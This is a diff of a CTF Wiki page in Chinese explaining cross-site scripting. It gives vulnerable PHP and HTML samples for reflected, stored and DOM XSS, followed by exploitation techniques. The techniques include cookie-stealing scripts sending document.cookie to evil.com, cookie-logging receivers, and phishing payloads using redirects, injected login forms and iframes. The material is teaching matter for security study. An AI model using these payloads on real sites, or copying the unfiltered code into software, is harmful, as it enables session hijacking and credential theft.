@@ -1,92 +1,243 @@
 
 
-<!DOCTYPE html>
-<!--[if IE 8]><html class="no-js lt-ie9" lang="en" > <![endif]-->
-<!--[if gt IE 8]><!--> <html class="no-js" lang="en" > <!--<![endif]-->
-<head>
-  <meta charset="utf-8">
-  
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  
-  <title>XSS 跨站脚本攻击 &mdash; CTF Wiki  文档</title>
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+  "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>XSS 跨站脚本攻击 &#8212; CTF Wiki v</title>
+    <link rel="stylesheet" href="../_static/cloud.css" type="text/css" />
+    <link rel="stylesheet" href="../_static/pygments.css" type="text/css" />
+    <link rel="stylesheet" href="//fonts.googleapis.com/css?family=Noticia+Text|Open+Sans|Droid+Sans+Mono" type="text/css" />
+    <script type="text/javascript">
+      var DOCUMENTATION_OPTIONS = {
+        URL_ROOT:    '../',
+        VERSION:     '',
+        COLLAPSE_INDEX: false,
+        FILE_SUFFIX: '.html',
+        HAS_SOURCE:  true,
+        SOURCELINK_SUFFIX: '.txt'
+      };
+    </script>
+    <script type="text/javascript" src="../_static/jquery.js"></script>
+    <script type="text/javascript" src="../_static/underscore.js"></script>
+    <script type="text/javascript" src="../_static/doctools.js"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.1/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+    <script type="text/javascript" src="../_static/jquery.cookie.js"></script>
+    <script type="text/javascript" src="../_static/cloud.base.js"></script>
+    <script type="text/javascript" src="../_static/cloud.js"></script>
+    <link rel="shortcut icon" href="../_static/favicon.ico"/>
+    <link rel="search" title="Search" href="../search.html" />
+    <link rel="next" title="CSRF 跨站请求伪造" href="csrf.html" />
+    <link rel="prev" title="SQL 注入" href="sqli.html" /> 
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+  </head>
+  <body>
+    <div class="relbar-top">
+        
+    <div class="related" role="navigation" aria-label="related navigation">
+      <h3>Navigation</h3>
+      <ul>
+        <li class="right" style="margin-right: 10px">
+          <a href="csrf.html" title="CSRF 跨站请求伪造"
+             accesskey="N">next</a></li>
+        <li class="right" >
+          <a href="sqli.html" title="SQL 注入"
+             accesskey="P">previous</a> &nbsp; &nbsp;</li>
+    <li><a href="../index.html">CTF Wiki </a> &#187;</li>
+ 
+      </ul>
+    </div>
+    </div>
   
 
-  
-  
-  
-  
-
-  
-
-  
-  
-    
-
-  
-
-  
-  
-    <link rel="stylesheet" href="../_static/css/theme.css" type="text/css" />
-  
-
-  
-
-  
-        <link rel="index" title="索引"
-              href="../genindex.html"/>
-        <link rel="search" title="搜索" href="../search.html"/>
-    <link rel="top" title="CTF Wiki  文档" href="../index.html"/>
-        <link rel="next" title="CSRF 跨站请求伪造" href="csrf.html"/>
-        <link rel="prev" title="SQL 注入" href="sqli.html"/> 
-
-  
-  <script src="../_static/js/modernizr.min.js"></script>
-
-</head>
-
-<body class="wy-body-for-nav" role="document">
-
-   
-  <div class="wy-grid-for-nav">
-
-    
-    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
-      <div class="wy-side-scroll">
-        <div class="wy-side-nav-search">
-          
-
-          
-            <a href="../index.html" class="icon icon-home"> CTF Wiki
-          
-
-          
-          </a>
-
-          
+    <div class="document">
+      <div class="documentwrapper">
+        <div class="bodywrapper">
+          <div class="body" role="main">
             
-            
-          
-
-          
-<div role="search">
-  <form id="rtd-search-form" class="wy-form" action="../search.html" method="get">
-    <input type="text" name="q" placeholder="Search docs" />
-    <input type="hidden" name="check_keywords" value="yes" />
-    <input type="hidden" name="area" value="default" />
-  </form>
+  <div class="section" id="xss">
+<h1>XSS 跨站脚本攻击<a class="headerlink" href="#xss" title="Permalink to this headline">¶</a></h1>
+<div class="section" id="id1">
+<h2>XSS 简介<a class="headerlink" href="#id1" title="Permalink to this headline">¶</a></h2>
+<p>跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取
+Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
+<div class="section" id="id2">
+<h3>反射型 XSS<a class="headerlink" href="#id2" title="Permalink to this headline">¶</a></h3>
+<p>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。</p>
+<p>反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
+<p>服务器端代码：</p>
+<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="c1">// Is there any input?</span>
+<span class="k">if</span><span class="p">(</span> <span class="nb">array_key_exists</span><span class="p">(</span> <span class="s2">&quot;name&quot;</span><span class="p">,</span> <span class="nv">$_GET</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;name&#39;</span> <span class="p">]</span> <span class="o">!=</span> <span class="k">NULL</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Feedback for end user</span>
+    <span class="k">echo</span> <span class="s1">&#39;&lt;pre&gt;Hello &#39;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;name&#39;</span> <span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+</div>
+<p>可以看到，代码直接引用了 <code class="docutils literal"><span class="pre">name</span></code> 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。</p>
+</div>
+<div class="section" id="id3">
+<h3>持久型 XSS<a class="headerlink" href="#id3" title="Permalink to this headline">¶</a></h3>
+<p>持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</p>
+<p>此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
+<p>服务器端代码：</p>
+<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+  <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span> <span class="s1">&#39;btnSign&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
+    <span class="c1">// Get input</span>
+    <span class="nv">$message</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span> <span class="s1">&#39;mtxMessage&#39;</span> <span class="p">]</span> <span class="p">);</span>
+    <span class="nv">$name</span>    <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span> <span class="s1">&#39;txtName&#39;</span> <span class="p">]</span> <span class="p">);</span>
+    <span class="c1">// Sanitize message input</span>
+    <span class="nv">$message</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span> <span class="nv">$message</span> <span class="p">);</span>
+    <span class="nv">$message</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span> <span class="nv">$message</span> <span class="p">);</span>
+    <span class="c1">// Sanitize name input</span>
+    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span> <span class="nv">$name</span> <span class="p">);</span>
+    <span class="c1">// Update database</span>
+    <span class="nv">$query</span>  <span class="o">=</span> <span class="s2">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;</span><span class="si">$message</span><span class="s2">&#39;, &#39;</span><span class="si">$name</span><span class="s2">&#39; );&quot;</span><span class="p">;</span>
+    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span> <span class="nv">$query</span> <span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span> <span class="s1">&#39;&lt;pre&gt;&#39;</span> <span class="o">.</span> <span class="nb">mysql_error</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span> <span class="p">);</span>
+    <span class="c1">//mysql_close(); }</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+</div>
+<p>代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。</p>
+</div>
+<div class="section" id="dom-xss">
+<h3>DOM XSS<a class="headerlink" href="#dom-xss" title="Permalink to this headline">¶</a></h3>
+<p>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</p>
+<p>HTML 代码：</p>
+<div class="highlight-html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>DOM-XSS test<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+      <span class="kd">var</span> <span class="nx">a</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">URL</span><span class="p">;</span>
+      <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;a=&quot;</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">,</span><span class="nx">a</span><span class="p">.</span><span class="nx">length</span><span class="p">));</span>
+    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+</div>
+<p>将代码保存在 domXSS.html 中，浏览器访问：</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>http://127.0.0.1/domXSS.html?a=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
+</pre></div>
+</div>
+<p>即可触发 XSS 漏洞。</p>
+</div>
+</div>
+<div class="section" id="id4">
+<h2>XSS 利用方式<a class="headerlink" href="#id4" title="Permalink to this headline">¶</a></h2>
+<div class="section" id="cookies">
+<h3>Cookies 窃取<a class="headerlink" href="#cookies" title="Permalink to this headline">¶</a></h3>
+<p>攻击者可以使用以下代码获取客户端的 Cookies 信息：</p>
+<div class="highlight-html"><div class="highlight"><pre><span></span>&lt;script&gt;
+document.location=&quot;http://www.evil.com/cookie.asp?cookie=&quot;+document.cookie
+new Image().src=&quot;http://www.evil.com/cookie.asp?cookie=&quot;+document.cookie
+&lt;/script&gt;
+&lt;img src=&quot;http://www.evil.com/cookie.asp?cookie=&quot;+document.cookie&gt;&lt;/img&gt;
+</pre></div>
+</div>
+<p>在远程服务器上，有一个接受和记录 Cookies 信息的文件，示例如下：</p>
+<div class="highlight-asp"><div class="highlight"><pre><span></span>&lt;%
+  msg=Request.ServerVariables(&quot;QUERY_STRING&quot;)
+  testfile=Server.MapPath(&quot;cookie.txt&quot;)
+  set fs=server.CreateObject(&quot;Scripting.filesystemobject&quot;)
+  set thisfile=fs.OpenTextFile(testfile,8,True,0)
+  thisfile.Writeline(&quot;&quot;&amp;msg&amp; &quot;&quot;)
+  thisfile.close
+  set fs=nothing
+%&gt;
+</pre></div>
+</div>
+<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$cookie</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;cookie&#39;</span><span class="p">];</span>
+<span class="nv">$log</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;cookie.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;a&quot;</span><span class="p">);</span>
+<span class="nb">fwrite</span><span class="p">(</span><span class="nv">$log</span><span class="p">,</span> <span class="nv">$cookie</span> <span class="o">.</span> <span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">);</span>
+<span class="nb">fclose</span><span class="p">(</span><span class="nv">$log</span><span class="p">);</span>
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+</div>
+<p>攻击者在获取到 Cookies 之后，通过修改本机浏览器的 Cookies，即可登录受害者的账户。</p>
+</div>
+<div class="section" id="id5">
+<h3>会话劫持<a class="headerlink" href="#id5" title="Permalink to this headline">¶</a></h3>
+<p>由于使用 Cookies 存在一定的安全缺陷，因此，开发者开始使用一些更为安全的认证方式，如 Session。在 Session 机制中，客户端和服务端通过标识符来识别用户身份和维持会话，但这个标识符也有被其他人利用的可能。会话劫持的本质是在攻击中带上了 Cookies 并发送到了服务端。</p>
+<p>如某 CMS 的留言系统存在一个存储型 XSS 漏洞，攻击者把 XSS 代码写进留言信息中，当管理员登录后台并查看是，便会触发 XSS 漏洞，由于 XSS 是在后台触发的，所以攻击的对象是管理员，通过注入 JavaScript 代码，攻击者便可以劫持管理员会话执行某些操作，从而达到提升权限的目的。</p>
+<p>比如，攻击者想利用 XSS 添加一个管理员账号，只需要通过之前的代码审计或其他方式，截取到添加管理员账号时的 HTTP 请求信息，然后使用 XMLHTTP 对象在后台发送一个 HTTP 请求即可，由于请求带上了被攻击者的 Cookies，并一同发送到服务端，即可实现添加一个管理员账户的操作。</p>
+</div>
+<div class="section" id="id6">
+<h3>钓鱼<a class="headerlink" href="#id6" title="Permalink to this headline">¶</a></h3>
+<ul class="simple">
+<li>重定向钓鱼</li>
+</ul>
+<p>把当前页面重定向到一个钓鱼页面。</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>http://www.bug.com/index.php?search=&quot;&#39;&gt;&lt;script&gt;document.location.href=&quot;http://www.evil.com&quot;&lt;/script&gt;
+</pre></div>
+</div>
+<ul class="simple">
+<li>HTML 注入式钓鱼</li>
+</ul>
+<p>使用 XSS 漏洞注入 HTML 或 JavaScript 代码到页面中。</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>http://www.bug.com/index.php?search=&quot;&#39;&lt;html&gt;&lt;head&gt;&lt;title&gt;login&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;div style=&quot;text-align:center;&quot;&gt;&lt;form Method=&quot;POST&quot; Action=&quot;phishing.php&quot; Name=&quot;form&quot;&gt;&lt;br /&gt;&lt;br /&gt;Login:&lt;br/&gt;&lt;input name=&quot;login&quot; /&gt;&lt;br /&gt;Password:&lt;br/&gt;&lt;input name=&quot;Password&quot; type=&quot;password&quot; /&gt;&lt;br/&gt;&lt;br/&gt;&lt;input name=&quot;Valid&quot; value=&quot;Ok&quot; type=&quot;submit&quot; /&gt;&lt;br/&gt;&lt;/form&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;
+</pre></div>
+</div>
+<p>该段代码会在正常页面中嵌入一个 Form 表单。</p>
+<ul class="simple">
+<li>iframe 钓鱼</li>
+</ul>
+<p>这种方式是通过 <code class="docutils literal"><span class="pre">&lt;iframe&gt;</span></code> 标签嵌入远程域的一个页面实施钓鱼。</p>
+<div class="highlight-default"><div class="highlight"><pre><span></span>http://www.bug.com/index.php?search=&#39;&gt;&lt;iframe src=&quot;http://www.evil.com&quot; height=&quot;100%&quot; width=&quot;100%&quot;&lt;/iframe&gt;
+</pre></div>
+</div>
+<ul class="simple">
+<li>Flash 钓鱼</li>
+</ul>
+<p>将构造好的 Flash 文件传入服务器，在目标网站用 <code class="docutils literal"><span class="pre">&lt;object&gt;</span></code> 或 <code class="docutils literal"><span class="pre">&lt;embed&gt;</span></code> 标签引用即可。</p>
+<ul class="simple">
+<li>高级钓鱼技术</li>
+</ul>
+<p>注入代码劫持 HTML 表单、使用 JavaScript 编写键盘记录器等。</p>
+</div>
+<div class="section" id="id7">
+<h3>网页挂马<a class="headerlink" href="#id7" title="Permalink to this headline">¶</a></h3>
+<p>一般都是通过篡改网页的方式来实现的，如在 XSS 中使用 <code class="docutils literal"><span class="pre">&lt;iframe&gt;</span></code> 标签。</p>
+</div>
+<div class="section" id="dos-ddos">
+<h3>DOS 与 DDOS<a class="headerlink" href="#dos-ddos" title="Permalink to this headline">¶</a></h3>
+<p>注入恶意 JavaScript 代码，可能会引起一些拒绝服务攻击。</p>
+</div>
+<div class="section" id="id8">
+<h3>XSS 蠕虫<a class="headerlink" href="#id8" title="Permalink to this headline">¶</a></h3>
+<p>通过精心构造的 XSS 代码，可以实现非法转账、篡改信息、删除文章、自我复制等诸多功能。</p>
+</div>
+</div>
 </div>
 
-          
-        </div>
 
-        <div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="main navigation">
-          
-            
-            
-              
-            
-            
-              <p class="caption"><span class="caption-text">CTF 介绍</span></p>
+          </div>
+        </div>
+      </div>
+      <div class="sphinxsidebar" role="navigation" aria-label="main navigation">
+        <div class="sphinxsidebarwrapper">
+        <p class="logo"><a href="../index.html" title="index">
+          <img class="logo" src="../_static/logo.png" alt="Logo"/>
+        </a></p>
+<div id="searchbox" style="display: none" role="search">
+  <h3>Quick search</h3>
+    <form class="search" action="../search.html" method="get">
+      <div><input type="text" name="q" /></div>
+      <div><input type="submit" value="Go" /></div>
+      <input type="hidden" name="check_keywords" value="yes" />
+      <input type="hidden" name="area" value="default" />
+    </form>
+</div>
+<script type="text/javascript">$('#searchbox').show(0);</script>
+<div class="sphinx-toc sphinxglobaltoc">
+<h3><a href="../index.html">Table Of Contents</a></h3>
+<p class="caption"><span class="caption-text">CTF 介绍</span></p>
 <ul>
 <li class="toctree-l1"><a class="reference internal" href="../introduction/history.html">CTF 竞赛的历史</a></li>
 <li class="toctree-l1"><a class="reference internal" href="../introduction/mode.html">CTF 竞赛模式简介</a></li>
@@ -158,298 +309,49 @@
 <ul>
 <li class="toctree-l1"><a class="reference internal" href="../executable/elf/index.html">ELF文件</a></li>
 </ul>
-
-            
-          
+</div>
         </div>
       </div>
-    </nav>
-
-    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap">
-
-      
-      <nav class="wy-nav-top" role="navigation" aria-label="top navigation">
-        
-          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
-          <a href="../index.html">CTF Wiki</a>
-        
-      </nav>
-
-
-      
-      <div class="wy-nav-content">
-        <div class="rst-content">
-          
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-<div role="navigation" aria-label="breadcrumbs navigation">
-
-  <ul class="wy-breadcrumbs">
-    
-      <li><a href="../index.html">Docs</a> &raquo;</li>
-        
-      <li>XSS 跨站脚本攻击</li>
     
     
-      <li class="wy-breadcrumbs-aside">
-        
+        <div class="sidebar-toggle-group no-js">
             
-            <a href="../_sources/web/xss.rst.txt" rel="nofollow"> View page source</a>
-          
-        
-      </li>
+            <button class="sidebar-toggle" id="sidebar-hide" title="Hide the sidebar menu">
+                 «
+                <span class="show-for-small">hide menu</span>
+                
+            </button>
+            <button class="sidebar-toggle" id="sidebar-show" title="Show the sidebar menu">
+                
+                <span class="show-for-small">menu</span>
+                <span class="hide-for-small">sidebar</span>
+                 »
+            </button>
+        </div>
     
-  </ul>
-
-  
-  <hr/>
-</div>
-          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
-           <div itemprop="articleBody">
-            
-  <div class="section" id="xss">
-<h1>XSS 跨站脚本攻击<a class="headerlink" href="#xss" title="永久链接至标题">¶</a></h1>
-<div class="section" id="id1">
-<h2>XSS 简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h2>
-<p>跨站脚本（Cross-Site Scripting，XSS）是一种经常出现在 WEB 应用程序中的计算机安全漏洞，是由于 WEB 应用程序对用户的输入过滤不足而产生的。攻击者利用网站漏洞把恶意的脚本代码注入到网页中，当其他用户浏览这些网页时，就会执行其中的恶意代码，对受害用户可能采取
-Cookies 资料窃取、会话劫持、钓鱼欺骗等各种攻击。</p>
-<div class="section" id="id2">
-<h3>反射型 XSS<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h3>
-<p>反射型跨站脚本（Reflected Cross-Site Scripting）是最常见，也是使用最广的一种，可将恶意脚本附加到 URL 地址的参数中。</p>
-<p>反射型 XSS 的利用一般是攻击者通过特定手法（如电子邮件），诱使用户去访问一个包含恶意代码的 URL，当受害者点击这些专门设计的链接的时候，恶意代码会直接在受害者主机上的浏览器执行。此类 XSS 通常出现在网站的搜索栏、用户登录口等地方，常用来窃取客户端 Cookies 或进行钓鱼欺骗。</p>
-<p>服务器端代码：</p>
-<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
-<span class="c1">// Is there any input?</span>
-<span class="k">if</span><span class="p">(</span> <span class="nb">array_key_exists</span><span class="p">(</span> <span class="s2">&quot;name&quot;</span><span class="p">,</span> <span class="nv">$_GET</span> <span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;name&#39;</span> <span class="p">]</span> <span class="o">!=</span> <span class="k">NULL</span> <span class="p">)</span> <span class="p">{</span>
-    <span class="c1">// Feedback for end user</span>
-    <span class="k">echo</span> <span class="s1">&#39;&lt;pre&gt;Hello &#39;</span> <span class="o">.</span> <span class="nv">$_GET</span><span class="p">[</span> <span class="s1">&#39;name&#39;</span> <span class="p">]</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span><span class="p">;</span>
-<span class="p">}</span>
-<span class="cp">?&gt;</span><span class="x"></span>
-</pre></div>
-</div>
-<p>可以看到，代码直接引用了 <code class="docutils literal"><span class="pre">name</span></code> 参数，并没有做任何的过滤和检查，存在明显的 XSS 漏洞。</p>
-</div>
-<div class="section" id="id3">
-<h3>持久型 XSS<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h3>
-<p>持久型跨站脚本（Persistent Cross-Site Scripting）也等同于存储型跨站脚本（Stored Cross-Site Scripting）。</p>
-<p>此类 XSS 不需要用户单击特定 URL 就能执行跨站脚本，攻击者事先将恶意代码上传或储存到漏洞服务器中，只要受害者浏览包含此恶意代码的页面就会执行恶意代码。持久型 XSS 一般出现在网站留言、评论、博客日志等交互处，恶意脚本存储到客户端或者服务端的数据库中。</p>
-<p>服务器端代码：</p>
-<div class="highlight-php"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
-  <span class="k">if</span><span class="p">(</span> <span class="nb">isset</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span> <span class="s1">&#39;btnSign&#39;</span> <span class="p">]</span> <span class="p">)</span> <span class="p">)</span> <span class="p">{</span>
-    <span class="c1">// Get input</span>
-    <span class="nv">$message</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span> <span class="s1">&#39;mtxMessage&#39;</span> <span class="p">]</span> <span class="p">);</span>
-    <span class="nv">$name</span>    <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span> <span class="nv">$_POST</span><span class="p">[</span> <span class="s1">&#39;txtName&#39;</span> <span class="p">]</span> <span class="p">);</span>
-    <span class="c1">// Sanitize message input</span>
-    <span class="nv">$message</span> <span class="o">=</span> <span class="nb">stripslashes</span><span class="p">(</span> <span class="nv">$message</span> <span class="p">);</span>
-    <span class="nv">$message</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span> <span class="nv">$message</span> <span class="p">);</span>
-    <span class="c1">// Sanitize name input</span>
-    <span class="nv">$name</span> <span class="o">=</span> <span class="nb">mysql_real_escape_string</span><span class="p">(</span> <span class="nv">$name</span> <span class="p">);</span>
-    <span class="c1">// Update database</span>
-    <span class="nv">$query</span>  <span class="o">=</span> <span class="s2">&quot;INSERT INTO guestbook ( comment, name ) VALUES ( &#39;</span><span class="si">$message</span><span class="s2">&#39;, &#39;</span><span class="si">$name</span><span class="s2">&#39; );&quot;</span><span class="p">;</span>
-    <span class="nv">$result</span> <span class="o">=</span> <span class="nb">mysql_query</span><span class="p">(</span> <span class="nv">$query</span> <span class="p">)</span> <span class="k">or</span> <span class="k">die</span><span class="p">(</span> <span class="s1">&#39;&lt;pre&gt;&#39;</span> <span class="o">.</span> <span class="nb">mysql_error</span><span class="p">()</span> <span class="o">.</span> <span class="s1">&#39;&lt;/pre&gt;&#39;</span> <span class="p">);</span>
-    <span class="c1">//mysql_close(); }</span>
-<span class="cp">?&gt;</span><span class="x"></span>
-</pre></div>
-</div>
-<p>代码只对一些空白符、特殊符号、反斜杠进行了删除或转义，没有做 XSS 的过滤和检查，且存储在数据库中，明显存在存储型 XSS 漏洞。</p>
-</div>
-<div class="section" id="dom-xss">
-<h3>DOM XSS<a class="headerlink" href="#dom-xss" title="永久链接至标题">¶</a></h3>
-<p>传统的 XSS 漏洞一般出现在服务器端代码中，而 DOM-Based XSS 是基于 DOM 文档对象模型的一种漏洞，所以，受客户端浏览器的脚本代码所影响。客户端 JavaScript 可以访问浏览器的 DOM 文本对象模型，因此能够决定用于加载当前页面的 URL。换句话说，客户端的脚本程序可以通过 DOM 动态地检查和修改页面内容，它不依赖于服务器端的数据，而从客户端获得 DOM 中的数据（如从 URL 中提取数据）并在本地执行。另一方面，浏览器用户可以操纵 DOM 中的一些对象，例如 URL、location 等。用户在客户端输入的数据如果包含了恶意 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到基于 DOM 的 XSS 攻击。</p>
-<p>HTML 代码：</p>
-<div class="highlight-html"><div class="highlight"><pre><span></span><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>DOM-XSS test<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
-  <span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
-  <span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
-    <span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
-      <span class="kd">var</span> <span class="nx">a</span><span class="o">=</span><span class="nb">document</span><span class="p">.</span><span class="nx">URL</span><span class="p">;</span>
-      <span class="nb">document</span><span class="p">.</span><span class="nx">write</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">substring</span><span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;a=&quot;</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="p">,</span><span class="nx">a</span><span class="p">.</span><span class="nx">length</span><span class="p">));</span>
-    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
-  <span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
-<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
-</pre></div>
-</div>
-<p>将代码保存在 domXSS.html 中，浏览器访问：</p>
-<div class="highlight-default"><div class="highlight"><pre><span></span>http://127.0.0.1/domXSS.html?a=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
-</pre></div>
-</div>
-<p>即可触发 XSS 漏洞。</p>
-</div>
-</div>
-<div class="section" id="id4">
-<h2>XSS 利用方式<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h2>
-<div class="section" id="cookies">
-<h3>Cookies 窃取<a class="headerlink" href="#cookies" title="永久链接至标题">¶</a></h3>
-<p>攻击者可以使用以下代码获取客户端的 Cookies 信息：</p>
-<div class="highlight-html"><div class="highlight"><pre><span></span>&lt;script&gt;
-document.location=&quot;http://www.evil.com/cookie.asp?cookie=&quot;+document.cookie
-new Image().src=&quot;http://www.evil.com/cookie.asp?cookie=&quot;+document.cookie
-&lt;/script&gt;
-&lt;img src=&quot;http://www.evil.com/cookie.asp?cookie=&quot;+document.cookie&gt;&lt;/img&gt;
-</pre></div>
-</div>
-<p>在远程服务器上，有一个接受和记录 Cookies 信息的文件，示例如下：</p>
-<div class="highlight-asp"><div class="highlight"><pre><span></span>&lt;%
-  msg=Request.ServerVariables(&quot;QUERY_STRING&quot;)
-  testfile=Server.MapPath(&quot;cookie.txt&quot;)
